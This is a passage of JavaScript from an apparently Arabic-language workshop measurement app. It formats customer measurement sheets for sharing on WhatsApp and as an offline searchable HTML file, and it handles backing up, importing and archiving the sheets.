                     a.data && Array.isArray(a.data.jobList) && a.data.jobList.length);
      const list = onlyUnapproved ? live.filter(a => !a.approved) : live;
      if (!list.length) return null;

      list.sort((a, b) => (a.approved === b.approved)
        ? ((b.updatedAt || 0) - (a.updatedAt || 0))
        : (a.approved ? 1 : -1));

      /* ملخّص الرأس: العددان معاً. فمن يفتح الملف بعد شهر يعرف ما فيه
         قبل أن يقرأ سطراً واحداً. */
      const nApr = list.filter(a => a.approved).length;

      /* مجاميع كل الكراسات في الرأس: من يفتح الملف يعرف حجم العمل والمال
         المعلَّق قبل أن يقرأ سطراً. */
      let gM = 0, gT = 0, gP = 0;
      list.forEach(a => {
        const d = a.data || {};
        (d.jobList || []).forEach(i => { gM += (parseFloat(i.res) || 0); });
        let tt = 0;
        (d.billData || []).forEach(x => { tt = money2(tt + money2((+x.q || 0) * (+x.p || 0))); });
        gT = money2(gT + tt);
        gP = money2(gP + money2(d.sheetPaid || a.approvedPaid || 0));
      });
      const gD = money2(Math.max(0, gT - gP));

      let t = '*جداول المقاسات — ' + list.length + ' كراسة*\n';
      t += '✅ معتمدة: ' + nApr + '   ⏳ غير معتمدة: ' + (list.length - nApr) + '\n';
      t += '📐 إجمالي الأمتار: (\u2066' + money2(gM).toFixed(2) + '\u2069 م²)\n';
      if (gT > 0 || gP > 0) {
        t += '💰 الإجمالي: \u2066' + gT.toFixed(2) + '\u2069   ✅ المدفوع: \u2066' +
             gP.toFixed(2) + '\u2069   🔴 الدين: \u2066' + gD.toFixed(2) + '\u2069 د.ل\n';
      }
      t += new Date().toLocaleDateString('ar-EG') + '\n';
      t += '═══════════════\n\n';

      list.forEach((a, n) => {
        const d = a.data || {};
        t += '*' + (n + 1) + '. ' + (d.custName || a.name || 'بدون اسم') + '*';
        t += a.approved ? '  ✅ معتمدة\n' : '  ⏳ غير معتمدة\n';
        /* ⚠️ 9.5.4 — الهاتف والموقع مع كل كراسة.

           المشاركة تُرسَل إلى من سيذهب إلى الزبون: الرقم ليتصل قبل
           الخروج، والرابط ليصل بلا أن يسأل عن العنوان. وكلاهما محفوظ
           في الكراسة أصلاً (buildStateSnapshot يحفظ custLocation)، وكان
           يُهمل عند المشاركة فيُعاد جمعُه بالهاتف في كل مرة.

           والرقم معزول الاتجاه: رقمٌ يبدأ بصفر بين نصّ عربي تُعاد ترتيب
           خاناته، فيُقرأ 0912 على أنه 2190 — ويُتصل بغير الزبون. */
        if (d.custPhone) t += '📞 \u2066' + d.custPhone + '\u2069\n';
        const L = d.custLocation;
        if (L && typeof L.lat === 'number' && typeof L.lng === 'number') {
          t += '📍 https://www.google.com/maps?q=' +
               L.lat.toFixed(7) + ',' + L.lng.toFixed(7) + '\n';
        }

        let mtr = 0;
        (d.jobList || []).forEach((i, k) => {
          mtr += (parseFloat(i.res) || 0);
          /* ⚠️ 9.5.3 — ترتيب السطر مقلوب في واتساب.

             السطر يخلط عربياً («PVC» و«سرانتي») بأرقامٍ ورموزٍ محايدة
             الاتجاه (| و × و .). وخوارزمية الاتجاه ثنائي المحور تُعيد
             ترتيب المحايدات بحسب ما حولها — فيخرج «127.1×190.3» مقلوباً،
             أو تنتقل الفواصل إلى غير موضعها، ويقرأ المشغّل العرض ارتفاعاً.
             وهو خطأ لا يُكتشف إلا بعد القصّ.

             و‎\u2066…\u2069 (عزل من اليسار لليمين) يُثبّت الجزء الرقمي كما
             كُتب مهما كان ما حوله — وهي الطريقة الوحيدة التي تعمل داخل
             نصّ واتساب، إذ لا CSS هناك ولا dir="ltr". */
          /* ⚠️ 9.5.4 — الصيغة بطلبك:  1- 90×99  (1.00 م²)

             ثلاثة تغييرات:
               • الترتيب معكوس: الارتفاع ثم العرض (كان العرض ثم الارتفاع).
               • بلا مسافات حول × ، فيُقرأ الرقمان كوحدة واحدة.
               • المتر بين قوسين لا بعد فاصل | — فالفواصل المتتابعة تجعل
                 السطر يبدو سلسلة أرقام متساوية، والقوس يفصل الحساب عن
                 المقاس فلا يختلط أحدهما بالآخر.

             ⚠️ ونبقي محرفَي العزل (‎\u2066…\u2069) حول كل رقم: بدونهما
             تُعيد خوارزمية الاتجاه ترتيب ما حول × و( ) بحسب ما جاورها،
             فينقلب الرقمان في واتساب من تلقاء نفسه — وهو ما لا يُكتشف
             إلا بعد القصّ. العزل يثبّت ما كُتب مهما كان ما حوله. */
          /* ⚠️ 9.6.0 — المسافات حول × أُعيدت بطلبك:  1- 90 × 60

             وهي ليست تجميلاً: هذا ما يراه المستخدم في جدول الكراسة نفسه
             (`${i.w} × ${i.h}` وتعيد خوارزمية الاتجاه ترتيبه في صفحة
             عربية فيظهر الارتفاع أولاً). فإن اختلفت الرسالة عن الجدول
             ولو بمسافة، شكّ المشغّل في الرقمين معاً وعاد يسأل.

             والترتيب هنا h ثم w داخل عزل LTR = نفس ما يظهر في الجدول
             بالضبط. ونُبقي العزل لا نعتمد على خوارزمية الاتجاه: سلوكها
             يختلف بين واتساب وتيليجرام والبريد، والعزل يثبّت الناتج في
             الثلاثة. */
          const dims = '\u2066' + i.h + ' × ' + i.w + '\u2069';
          t += '  ' + (k + 1) + '- ' + dims +
               (i.res ? ('  (\u2066' + i.res + '\u2069 م²)') : '') +
               '  ' + getTypeName(i.type) +
               (i.sk ? (' | ' + i.sk) : '') +
               (i.itemColor ? (' | ' + i.itemColor) : '') +
               (i.note ? ('  — ' + i.note) : '') + '\n';
        });
        if (d.sheetNotes) t += '  📝 ' + d.sheetNotes + '\n';

        /* ── أرقام الكراسة: الأمتار والمال ──
           كانت المشاركة تنقل المقاسات وحدها، فمن يستلمها يعرف ما يُقصّ
           ولا يعرف ما على الزبون. والملف الواحد يصير كشف حساب كذلك.

           والمبالغ من البنود المالية المحفوظة في الكراسة نفسها، وتُحسب
           بـ money2 — نفس الدالة التي يحسب بها الاعتماد. فلا يختلف رقمٌ
           هنا عن رقمٍ في الفاتورة ولو بقرش. */
        const bill = (d.billData || []);
        let tot = 0;
        bill.forEach(x => { tot = money2(tot + money2((+x.q || 0) * (+x.p || 0))); });
        const paid = money2(d.sheetPaid || a.approvedPaid || 0);
        const debt = money2(Math.max(0, tot - paid));

        t += '  ── ' + (d.jobList || []).length + ' مقاس  (\u2066' +
             money2(mtr).toFixed(2) + '\u2069 م²)\n';
        if (tot > 0 || paid > 0) {
          t += '  💰 الإجمالي: \u2066' + tot.toFixed(2)  + '\u2069 د.ل\n';
          t += '  ✅ المدفوع: \u2066'  + paid.toFixed(2) + '\u2069 د.ل\n';
          t += '  ' + (debt > 0 ? '🔴 الدين: \u2066' + debt.toFixed(2) + '\u2069 د.ل'
                                : '🟢 مسدَّدة بالكامل') + '\n';
        }
        t += '───────────────\n';
      });
      return t;
    }

    function wsShareEsc(v) {
      return String(v == null ? '' : v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
    }

    /* ملف الإرسال المرئي — 9.9.4
       بدلاً من TXT غير القابل للتنسيق، ننشئ HTML RTL أنيقاً يعمل حتى بعد
       انقطاع الإنترنت. كل مقاس له بطاقة مستقلة، والمقاس والنتيجة بلونين
       مختلفين، مع بحث فوري داخل الملف نفسه. */
    function wsOneSheetCopyText(a) {
      const d=a.data||{},lines=['الزبون: '+(d.custName||a.name||'بدون اسم')];
      if(d.custPhone)lines.push('الهاتف: '+d.custPhone);
      (d.jobList||[]).forEach((i,k)=>lines.push((k+1)+'. '+getTypeName(i.type)+' | عرض '+i.w+' × ارتفاع '+i.h+' | '+i.res+' م²'+(i.note?' — '+i.note:'')));
      if(d.sheetNotes)lines.push('ملاحظات الكراسة: '+d.sheetNotes);
      return lines.join('\n');
    }
    // Embedded in the exported HTML: no external scripts or network needed.
    function wsExportedSheetsRuntime(){
      function normalized(value){return String(value||'').toLowerCase().replace(/[٠-٩]/g,c=>'٠١٢٣٤٥٦٧٨٩'.indexOf(c)).replace(/[۰-۹]/g,c=>'۰۱۲۳۴۵۶۷۸۹'.indexOf(c)).replace(/[أإآ]/g,'ا').replace(/ى/g,'ي').replace(/٫/g,'.').replace(/[×x*]/g,' ').replace(/\s+/g,' ').trim();}
      window.filterRows=function(){
        const tokens=normalized(document.getElementById('q').value).split(' ').filter(Boolean);let sheets=0,rows=0;
        document.querySelectorAll('.sheet').forEach(s=>{
          const base=normalized(s.dataset.search);let count=0;
          s.querySelectorAll('.measure').forEach(r=>{const hay=base+' '+normalized(r.dataset.search);const ok=tokens.every(t=>hay.includes(t));r.style.display=ok?'flex':'none';if(ok){count++;rows++;}});
          s.style.display=count?'block':'none';if(count)sheets++;
        });
        document.getElementById('empty').style.display=sheets?'none':'block';
        document.getElementById('searchStatus').textContent=sheets+' كراسة — '+rows+' مقاس مطابق';
      };
      window.copySheet=async function(button){
        const sheet=button.closest('.sheet'),source=sheet.querySelector('.copy-data'),status=sheet.querySelector('.copy-status'),text=source.value;let copied=false;
        try{if(navigator.clipboard&&window.isSecureContext){await navigator.clipboard.writeText(text);copied=true;}}catch(e){}
        if(!copied){const temp=document.createElement('textarea');temp.value=text;temp.style.cssText='position:fixed;left:-9999px;top:0';document.body.appendChild(temp);temp.select();try{copied=!!document.execCommand('copy');}catch(e){}temp.remove();}
        status.textContent=copied?'تم نسخ جميع مقاسات هذه الكراسة':'النسخ التلقائي غير متاح؛ حدّد النص أدناه وانسخه';
        source.hidden=copied;
        if(!copied){source.style.cssText='display:block;width:100%;min-height:180px;white-space:pre-wrap';source.focus();source.select();}
      };
      window.filterRows();
    }
    function buildAllSheetsHtml(onlyUnapproved) {
      const live = (archives || []).filter(a => !a.deleted && a.data &&
        Array.isArray(a.data.jobList) && a.data.jobList.length);
      const list = onlyUnapproved ? live.filter(a => !a.approved) : live;
      if (!list.length) return null;
      list.sort((a,b) => (a.approved === b.approved)
        ? ((b.updatedAt || 0) - (a.updatedAt || 0))
        : (a.approved ? 1 : -1));

      const nApr = list.filter(a => a.approved).length;
      let gM=0,gT=0,gP=0;
      list.forEach(a=>{
        const d=a.data||{};
        (d.jobList||[]).forEach(i=>gM += parseFloat(i.res)||0);
        let tt=0;
        (d.billData||[]).forEach(x=>tt=money2(tt+money2((+x.q||0)*(+x.p||0))));
        gT=money2(gT+tt); gP=money2(gP+money2(d.sheetPaid||a.approvedPaid||0));
      });
      const gD=money2(Math.max(0,gT-gP));

      let h='<!doctype html><html translate="no" lang="ar" dir="rtl"><head><meta charset="utf-8">';
      h+='<meta name="viewport" content="width=device-width,initial-scale=1">';
      h+='<title>جداول المقاسات</title><style>'+
        ':root{--bg:#f4f7f6;--ink:#17211e;--muted:#6b7773;--green:#126b49;--line:#dce6e2;--dim:#e9f6ff;--res:#fff2d9;--shadow:0 8px 24px rgba(18,40,32,.08)}'+
        '*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);font-family:Tajawal,Cairo,Arial,sans-serif;padding:18px;line-height:1.7}'+
        '.top{max-width:900px;margin:auto}.hero{background:linear-gradient(135deg,#123f31,#167b55);color:#fff;border-radius:24px;padding:22px;box-shadow:var(--shadow);margin-bottom:14px}'+
        '.hero h1{margin:0 0 5px;font-size:25px}.hero p{margin:0;opacity:.9;font-size:13px}.stats{display:flex;gap:8px;flex-wrap:wrap;margin-top:15px}.stat{background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.2);border-radius:14px;padding:7px 11px;font-size:12px}'+
        '.search{position:sticky;top:10px;z-index:20;background:rgba(244,247,246,.95);backdrop-filter:blur(12px);padding:8px 0 12px}.search input{width:100%;border:2px solid var(--line);border-radius:16px;padding:13px 16px;font-size:15px;font-family:inherit;outline:none;background:#fff;box-shadow:0 5px 18px rgba(18,40,32,.06)}.search input:focus{border-color:#63b895}'+
        '.sheet{background:#fff;border:1px solid var(--line);border-radius:22px;margin:14px 0;overflow:hidden;box-shadow:var(--shadow)}'+
        '.sheetHead{padding:15px 17px;background:linear-gradient(180deg,#fff,#f6faf8);border-bottom:1px solid var(--line)}.name{font-size:18px;font-weight:900}.meta{font-size:12px;color:var(--muted);margin-top:3px}.badge{display:inline-block;padding:3px 9px;border-radius:999px;font-size:11px;font-weight:800;margin-right:5px}.ok{background:#def7e9;color:#11633e}.wait{background:#fff1cf;color:#8a5a00}'+
        '.rows{padding:10px}.measure{display:flex;align-items:center;gap:8px;padding:10px 7px;border-bottom:1px dashed #e3e9e6;min-height:56px}.measure:last-child{border-bottom:0}.num{width:32px;min-width:32px;height:32px;border-radius:50%;background:#123f31;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:12px}.dash{font-weight:900;color:#8a9691}.dim{background:var(--dim);color:#075985;border:1px solid #b9e4fa;border-radius:12px;padding:7px 10px;font-weight:900;direction:ltr;unicode-bidi:isolate;white-space:nowrap;box-shadow:0 3px 8px rgba(3,105,161,.08)}.res{background:var(--res);color:#9a5b00;border:1px solid #f2d28d;border-radius:12px;padding:5px 9px;font-weight:900;direction:ltr;unicode-bidi:isolate;white-space:nowrap}.detail{font-size:11px;color:var(--muted);margin-right:auto}.moneyBox{display:flex;flex-wrap:wrap;gap:5px;align-items:center;padding:7px 10px;background:#f8faf9;border-top:1px solid var(--line);font-size:10px;color:#596660}.billLine{padding:3px 6px;border-radius:7px;background:#fff;border:1px solid #e5ebe8;direction:rtl;white-space:nowrap}.moneyTotal,.moneyPaid,.moneyRemain{padding:3px 7px;border-radius:7px;font-weight:800;white-space:nowrap}.moneyTotal{background:#eef5f1;color:#155c43}.moneyPaid{background:#eaf8ef;color:#176b3d}.moneyRemain{background:#fff1f1;color:#a72c2c}.moneyBox b{font-weight:900}.footer{padding:14px;text-align:center;color:var(--muted);font-size:11px}.empty{display:none;text-align:center;padding:30px;color:var(--muted)}'+
        '@media(max-width:600px){body{padding:10px}.measure{gap:5px}.dim{font-size:13px;padding:6px 8px}.res{font-size:12px;padding:5px 7px}.detail{font-size:10px}}'+
        '</style></head><body><main class="top">';
      h+='<section class="hero"><h1>📐 جداول المقاسات</h1><p>ملف إرسال مرتب — المقاس باللون الأزرق والحساب داخل القوس باللون الذهبي</p><div class="stats">'+
        '<span class="stat">📚 '+list.length+' كراسة</span><span class="stat">✅ '+nApr+' معتمدة</span><span class="stat">⏳ '+(list.length-nApr)+' غير معتمدة</span><span class="stat">📏 '+money2(gM).toFixed(2)+' م²</span>'+
        (gT||gP?'<span class="stat">💰 '+gT.toFixed(2)+' د.ل</span><span class="stat">🔴 دين '+gD.toFixed(2)+' د.ل</span>':'')+
        '</div></section>';
      h+='<div class="search"><input id="q" aria-label="البحث في الزبائن والمقاسات" type="search" placeholder="🔎 ابحث باسم الزبون، النوع، المقاس أو الملاحظات..." oninput="filterRows()"><div id="searchStatus" aria-live="polite"></div></div><div id="all">';
      list.forEach((a,n)=>{
        const d=a.data||{};
        h+='<section class="sheet" data-search="'+wsShareEsc([d.custName,a.name,d.custPhone,d.sheetNotes].join(' '))+'"><div class="sheetHead">';
        h+='<div class="name">'+(n+1)+'. '+wsShareEsc(d.custName||a.name||'بدون اسم')+' <span class="badge '+(a.approved?'ok':'wait')+'">'+(a.approved?'✅ معتمدة':'⏳ غير معتمدة')+'</span></div>';
        if(d.custPhone) h+='<div class="meta">📞 '+wsShareEsc(d.custPhone)+'</div>';
        if(d.custLocation && typeof d.custLocation.lat==='number' && typeof d.custLocation.lng==='number') h+='<div class="meta">📍 <a href="https://www.google.com/maps?q='+d.custLocation.lat.toFixed(7)+','+d.custLocation.lng.toFixed(7)+'">فتح الموقع</a></div>';
        h+='<button type="button" onclick="copySheet(this)" style="padding:9px 14px;margin-top:8px;cursor:pointer;font-family:inherit">نسخ قياسات هذا الزبون</button><span class="copy-status" role="status" style="display:block;font-size:12px"></span>';
        h+='<textarea class="copy-data" readonly hidden aria-label="نص كراسة الزبون للنسخ">'+wsShareEsc(wsOneSheetCopyText(a))+'</textarea>';
        h+='</div><div class="rows">';
        (d.jobList||[]).forEach((i,k)=>{
          const dim=(i.h==null?'':i.h)+' × '+(i.w==null?'':i.w);
          const res=i.res ? i.res+' م²' : '—';
          const type=getTypeName(i.type);
          const note=[type,i.sk,i.itemColor,i.note].filter(Boolean).join(' · ');
          const searchable=[type,i.sk,i.itemColor,i.note,i.w,i.h,i.res].join(' ');
          h+='<div class="measure" data-search="'+wsShareEsc(searchable)+'">'+
             '<span class="num">'+(k+1)+'</span><span class="dash">-</span>'+
             '<span class="dim">'+wsShareEsc(dim)+'</span>'+'<span class="res">('+wsShareEsc(res)+')</span>'+'<span class="detail">'+wsShareEsc(note)+'</span></div>';
        });
        // البيانات المالية الكاملة للكراسة — بتنسيق مضغوط جداً
        const bill = Array.isArray(d.billData) ? d.billData : [];
        let sheetTotal = 0;
        bill.forEach(x => { sheetTotal = money2(sheetTotal + money2((+x.q || 0) * (+x.p || 0))); });
        const sheetPaid = money2(d.sheetPaid || a.approvedPaid || 0);
        const sheetRemain = money2(Math.max(0, sheetTotal - sheetPaid));
        if (bill.length || sheetTotal || sheetPaid) {
          h+='<div class=\"moneyBox\">';
          bill.forEach(x=>{
            const q=+x.q||0, price=+x.p||0, line=money2(q*price);
            const nm=wsShareEsc(x.name||x.itemName||x.title||'بند');
            h+='<span class=\"billLine\">'+nm+' <b>'+q+'</b>×<b>'+price.toFixed(2)+'</b>='+line.toFixed(2)+'</span>';
          });
          h+='<span class=\"moneyTotal\">الإجمالي <b>'+sheetTotal.toFixed(2)+'</b></span>';
          h+='<span class=\"moneyPaid\">المدفوع <b>'+sheetPaid.toFixed(2)+'</b></span>';
          h+='<span class=\"moneyRemain\">المتبقي <b>'+sheetRemain.toFixed(2)+'</b></span>';
          h+='</div>';
        }
        h+='</div></section>';
      });
      h+='</div><div id="empty" class="empty">لا توجد نتائج مطابقة للبحث.</div><div class="footer">تم إنشاء الملف: '+wsShareEsc(new Date().toLocaleString('ar-EG'))+'</div></main><scr'+'ipt>('+wsExportedSheetsRuntime.toString()+')();<\/script></body></html>';
      return h;
    }

    async function shareAllSheetTables() {
      // ملف مستقل يعمل بلا إنترنت، مع بحث ونسخ كراسة محددة.
      const text = buildAllSheetsHtml(false);
      if (!text) { alert('لا توجد كراسات فيها مقاسات لمشاركتها.'); return; }
      const n = (archives || []).filter(a => !a.deleted && a.data && Array.isArray(a.data.jobList) && a.data.jobList.length).length;
      const filename = 'كل-القياسات-' + n + '-' + new Date().toISOString().slice(0,10) + '.html';
      const blob = new Blob([text], { type: 'text/html;charset=utf-8' });
      try {
        const file = new File([blob], filename, { type: 'text/html' });
        if (navigator.canShare && navigator.canShare({ files: [file] })) {
          await navigator.share({ files: [file], title: 'كل القياسات', text: 'ملف قياسات مع بحث ونسخ لكل زبون' });
          showMiniToast('✅ تمت مشاركة ملف HTML قابل للبحث لكل القياسات', '#0f5132');
          return;
        }
      } catch(e) {
        if (e && e.name === 'AbortError') return;
        try { wsSilent && wsSilent('shareAllSheetTables:html-share', e); } catch(_) {}
      }
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = filename;
      document.body.appendChild(a); a.click(); a.remove();
      setTimeout(() => { try { URL.revokeObjectURL(url); } catch(e) {} }, 5000);
      showMiniToast('📄 تم تجهيز ملف HTML قابل للبحث لكل القياسات', '#0f5132');
    }

    // النسخ الاحتياطي عبر واتساب واستيراد/تصدير الملفات
    function sendBackupToWhatsApp() {
      saveCurrentState();
      let state = safeGetItem('ws_last_state') || '{}';
      let text = `نسخة احتياطية - مساعد الورشة\nWORKSHOP_BACKUP::${state}`;
      window.open(`https://wa.me/?text=${encodeURIComponent(text)}`);
    }

    function importFromText() {
      let text = prompt('الصق نص النسخة الاحتياطية هنا:');
      if(!text) return;
      try {
        let marker = 'WORKSHOP_BACKUP::';
        let idx = text.indexOf(marker);
        let jsonPart = idx > -1 ? text.substring(idx + marker.length) : text;
        let data = JSON.parse(jsonPart.trim());
        /* فكّ الارتباط **قبل** التحميل لا بعده: loadFromJSON يستدعي
           saveCurrentState في أثنائه، فلو بقي الارتباط بكراسة مفتوحة
           كُتبت البيانات المستوردة **فوقها** — تُمحى كراسة زبون بمحتوى
           نسخة احتياطية بلا أن يطلب أحد ذلك. */
        currentArchiveIndex = -1; setCurrentArchiveDoc(null);
        _loadingArchive = true;
        try { loadFromJSON(data); } finally { _loadingArchive = false; }
        saveCurrentState();
        alert('تم استيراد البيانات بنجاح ✅');
      } catch(e) {
        alert('⚠️ الكود غير صالح، تأكد من نسخ النص كاملاً وحاول مرة أخرى');
      }
    }

    /* ══════════════════════════════════════════════════════════════════
       حفظ ومشاركة **كل** الكراسات دفعة واحدة — 9.5.0
       ══════════════════════════════════════════════════════════════════
       التصديران القائمان (exportData و sendBackupToWhatsApp) يحفظان
       `ws_last_state` — أي **الكراسة المفتوحة وحدها**. فلم يكن في النظام
       سبيلٌ واحد لحفظ أرشيف الكراسات كله.

       وذلك فراغ خطير في نظام يقوم على Firestore: الأرشيف كله في حساب
       واحد على السحابة. وحسابٌ يُقفل، أو مشروعٌ يُحذف بالخطأ، أو فاتورة
       لا تُدفع — كلها تُنهي البيانات دفعةً واحدة، ولا نسخة خارجها.

       والملف الناتج مقروء ومستقل: JSON فيه كل كراسة بمقاساتها وبنودها
       وتواريخها. يُفتح في أي محرر ويُقرأ بالعين إن لزم — فلا يحتاج
       استرجاعُه هذا النظام نفسه.

       ونُصدّر **غير المحذوفة فقط**: ما في السلة سبق أن قرّر صاحبه حذفه،
       وإعادتُه في كل نسخة تجعل الاستيراد يُحيي ما دُفن. */
    function collectAllSheets() {
      const live = (archives || []).filter(a => !a.deleted);
      return {
        format: 'WORKSHOP_SHEETS_V1',
        exportedAt: new Date().toISOString(),
        exportedBy: (window.currentShopUser && window.currentShopUser.name) || '',
        build: (window.WS_BUILD || ''),
        count: live.length,
        sheets: live.map(a => ({
          id: a.id, name: a.name || '',
          approved: !!a.approved, approvedTotal: a.approvedTotal || 0,
          createdAt: a.createdAt || 0, updatedAt: a.updatedAt || 0,
          data: a.data || {}
        }))
      };
    }

    async function exportAllSheets() {
      const pack = collectAllSheets();
      if (!pack.count) { alert('لا توجد كراسات محفوظة لتصديرها.'); return; }

      const txt  = JSON.stringify(pack);
      const name = 'كل-الكراسات-' + pack.count + '-' +
                   new Date().toISOString().slice(0, 10) + '.json';
      const blob = new Blob([txt], { type: 'application/json' });

      /* المشاركة أولاً: الملف ينتقل إلى واتساب أو درايف أو البريد مباشرةً،
         وهي الطريقة التي تصل بها النسخة إلى **خارج الجهاز** فعلاً.
         والتنزيل وحده يتركها في نفس الجهاز الذي قد يضيع. */
      try {
        const file = new File([blob], name, { type: 'application/json' });
        if (navigator.canShare && navigator.canShare({ files: [file] })) {
          await navigator.share({ files: [file], title: 'نسخة كل الكراسات',
                                  text: 'نسخة احتياطية: ' + pack.count + ' كراسة' });
          showMiniToast('✅ شُورك ملف فيه ' + pack.count + ' كراسة', '#0f5132');
          return;
        }
      } catch (e) {
        if (e && e.name === 'AbortError') return;      // ألغى المستخدم المشاركة
        wsSilent && wsSilent('exportAllSheets:share', e);
      }

      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = name;
      document.body.appendChild(a); a.click(); a.remove();
      setTimeout(() => { try { URL.revokeObjectURL(url); } catch (e) {} }, 4000);
      showMiniToast('✅ نُزِّل ملف فيه ' + pack.count + ' كراسة', '#0f5132');
    }

    /* الاسترجاع — وبدونه يكون التصدير وعداً لا يُوفى.
       ولا يُستورَد إلا ما ليس موجوداً: الاستيراد لا يكتب فوق كراسة
       قائمة أبداً، فمن استورد نسخة قديمة لا يمحو بها عمل اليوم. */
    async function importAllSheets(input) {
      const file = input && input.files && input.files[0];
      if (!file) return;
      input.value = '';
      if (!isManagerUser()) { alert('⛔ استيراد الكراسات متاح للمدير فقط.'); return; }

      let pack;
      try { pack = JSON.parse(await file.text()); }
      catch (e) { alert('⚠️ الملف غير صالح — لم يُقرأ كـ JSON.'); return; }

      if (!pack || pack.format !== 'WORKSHOP_SHEETS_V1' || !Array.isArray(pack.sheets)) {
        alert('⚠️ هذا ليس ملف كراسات صادراً من النظام.'); return;
      }
      const have = new Set((archives || []).map(a => a.id));
      const fresh = pack.sheets.filter(x => x && x.id && !have.has(x.id));
      if (!fresh.length) { alert('✅ كل الكراسات في الملف موجودة لديك بالفعل — لم يُضَف شيء.'); return; }

      if (!confirm('الملف فيه ' + pack.sheets.length + ' كراسة، منها ' + fresh.length +
                   ' غير موجودة لديك.\n\nستُضاف هذه ' + fresh.length + ' فقط.\n' +
                   'ولن يُكتب فوق أي كراسة قائمة.')) return;

      let done = 0;
      for (const x of fresh) {
        try {
          fsSet('measurementJobs', x.id, {
            id: x.id, name: x.name || '', data: x.data || {},
            approved: !!x.approved, approvedTotal: x.approvedTotal || 0,
            createdAt: x.createdAt || Date.now(),
            createdByUid: x.createdByUid || ((window.currentShopUser && window.currentShopUser.uid) || ''),
            updatedAt: x.updatedAt || Date.now(),
            deleted: false, importedAt: Date.now()
          });
          done++;
        } catch (e) { console.error('import sheet', x.id, e); }
      }
      showMiniToast('✅ استُوردت ' + done + ' كراسة', '#0f5132');
    }

    function exportData() {
      saveCurrentState();
      let state = safeGetItem('ws_last_state') || '{}';
      let blob = new Blob([state], { type: 'application/json' });
      let url = URL.createObjectURL(blob);
      let a = document.createElement('a');
      let custName = document.getElementById('custName').value || 'ورشة';
      a.href = url;
      a.download = `طلب_${custName}_${formatWesternDate().replace(/\//g,'-')}.json`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }

    function importData(input) {
      let file = input.files[0];
      if(!file) return;
      let reader = new FileReader();
      reader.onload = (e) => {
        try {
          let data = JSON.parse(e.target.result);
          // فكّ الارتباط وتوليد عملية إنشاء مستقلة قبل الاستيراد، حتى لا يعاد استعمال معرف كراسة سابقة.
          rotateArchiveCreationOperationId();
          currentArchiveIndex = -1; setCurrentArchiveDoc(null);
          _loadingArchive = true;
          try { loadFromJSON(data); } finally { _loadingArchive = false; }
          saveCurrentState();
          alert('تم استيراد الملف بنجاح ✅');
        } catch(err) {
          alert('⚠️ تعذر قراءة الملف، تأكد أنه ملف نسخة احتياطية صحيح');
        }
      };
      reader.readAsText(file);
      input.value = '';
    }

    /* ============================================================
       حفظ المقاسات: يثبّت الكراسة الحالية في الأرشيف فوراً (بلا انتظار الحفظ التلقائي المؤجّل)
       ثم يفرّغ الشاشة لبدء زبون جديد، حتى لا تُكتب مقاسات جديدة فوق مقاسات سابقة.
       النسخة المحفوظة تبقى قابلة للفتح والتعديل من قائمة "الأرشيف والنسخ" بالأسفل.
       ============================================================ */
    /* mode: 'ask' سؤال قبل الحفظ (الزر اليدوي)
              'silent' حفظ فوري بلا سؤال (التحويل لفاتورة أو الحفظ التلقائي) */
    function saveMeasurementsSheet(mode) {
      /* v315: اسم بند مالي مقصود يكفي لحفظ الكراسة حتى إن لم تُضف مقاسات بعد.
         سابقاً كان هذا الحارس يوقف الحفظ قبل التقاط الحالة، فيبدو للمستخدم
         أن البنود المالية تختفي ولا يمكن حفظها. لا نسمح فقط بكراسة فارغة تماماً. */
      const _preSaveState = buildStateSnapshot();
      const _hasMeasuresToSave = Array.isArray(_preSaveState.jobList) && _preSaveState.jobList.length > 0;
      const _hasNamedFinancialItems = Array.isArray(_preSaveState.billData) && _preSaveState.billData.some(b => String((b && b.n) || '').trim());
      if (!_hasMeasuresToSave && !_hasNamedFinancialItems && !String(_preSaveState.custName||'').trim() && !String(_preSaveState.custPhone||'').trim()) {
        if (mode !== 'silent') {
          alert('⚠️ لا توجد مقاسات أو بنود مالية مسماة للحفظ.\n\nأضف مقاساً واحداً أو اكتب اسم بند مالي على الأقل.');
        }
        return false;
      }
      /* ثلاثة أوضاع:
           عادي   → يؤكّد ثم يؤرشف ويفرّغ
           silent → يؤرشف ويفرّغ بلا سؤال (الأرشفة التلقائية)
           keep   → يؤرشف **ولا يفرّغ** (اعتماد الخدمة)
         وضع keep ضروري: الاعتماد يريد أن تبقى الكراسة معروضة بحالتها
         المعتمدة — الزر أخضر ورقم الحساب ظاهر — فالتفريغ الفوري بعده
         يمحو التأكيد قبل أن يراه أحد. */
      const keepSheet = mode!=='new' && mode!=='silent';
      const silent = keepSheet || (mode === 'silent');
      if(editingIndex > -1) { if(!silent) alert('⚠️ يرجى إنهاء تعديل العنصر الحالي أولاً'); return false; }
      // التقط كل الحقول الحية — خصوصاً اسم البند المالي الذي قد يكون آخر ما كُتب —
      // وثبّت النسخة المحلية قبل أي أرشفة أو تفريغ للشاشة.
      const state = _preSaveState;
      try { const serializedState = JSON.stringify(state);
        safeSetItem('ws_last_state', serializedState);
        safeSetItem('ws_last_state_backup_v310', serializedState);
        safeSetItem('ws_last_state_backup_v310_at', String(Date.now()));
        safeSetItem('ws_last_state_backup_v312', serializedState);
        safeSetItem('ws_last_state_backup_v312_at', String(Date.now())); } catch (e) {}
      if(!hasMeaningfulData(state)) { if(!silent) alert('لا توجد مقاسات لحفظها بعد.'); return false; }

      const name = (document.getElementById('custName').value || '').trim() || 'بدون اسم';
      const count = jobList.length;
      const financialCount = Array.isArray(state.billData) ? state.billData.filter(b => String((b && b.n) || '').trim()).length : 0;
      if(!silent && !confirm(`سيتم حفظ كراسة «${name}» في الأرشيف (${count} مقاساً و${financialCount} بنداً مالياً)، ثم تُفرَّغ الشاشة لبدء كراسة جديدة.\n\nيمكنك فتحها وتعديلها في أي وقت من قائمة «الأرشيف والنسخ» بالأسفل.\n\nمتابعة؟`)) return false;

      // كتابة فورية: نلغي أي حفظ مؤجّل معلّق حتى لا يضيع أي تعديل كُتب قبل ثانية من الضغط
      if(archiveSyncTimer) { clearTimeout(archiveSyncTimer); archiveSyncTimer = null; }
